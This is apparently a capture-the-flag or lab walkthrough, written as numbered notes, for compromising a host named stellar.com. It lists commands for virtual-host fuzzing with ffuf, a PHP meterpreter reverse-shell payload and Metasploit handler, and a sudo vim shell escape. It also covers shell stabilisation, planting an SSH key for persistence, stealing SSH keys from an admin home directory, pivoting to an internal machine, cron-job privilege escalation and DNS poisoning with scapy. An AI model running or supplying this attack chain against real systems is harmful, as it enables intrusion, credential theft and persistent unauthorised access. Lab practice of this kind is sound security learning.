1. start at stellar.com
2. scan vhost for admin.com `ffuf -w wordlist.txt -u stellar.com -H "Host: FUZZ.com"`
3. reverse shell with metasploit docker
  - use `docker run -it -p 6666:6666 metasploitframework/metasploit-framework`
  - `use payload/php/meterpreter/reverse_tcp` -> generate -f raw
  - `use exploit/multi/handler`
  - start shell
4. privilege escallation with vim
  - `export PATH=$PATH:/run/wrappers/bin:/etc/profiles/per-user/web/bin:/run/current-system/sw/bin`
  - `sudo vim -c ':!/bin/sh'`
  - stabilize `python3 -c 'import pty; pty.spawn("bash")'`
  - add own ssh key for better shell
5. find ssh keys in /home/admin/.ssh
TODO : find ip of resolver with dig or traceroute
6. ssh into resolver with IP 10.0.2.2 -p 22224
7. privilege escalation cron job
8. list with tcpdump and see DNS packet
9.
  + run scapy to poison to redirect to web or attacker (or host here)
  + get the ip of the c2 and access with telnet
10. listen somewhere
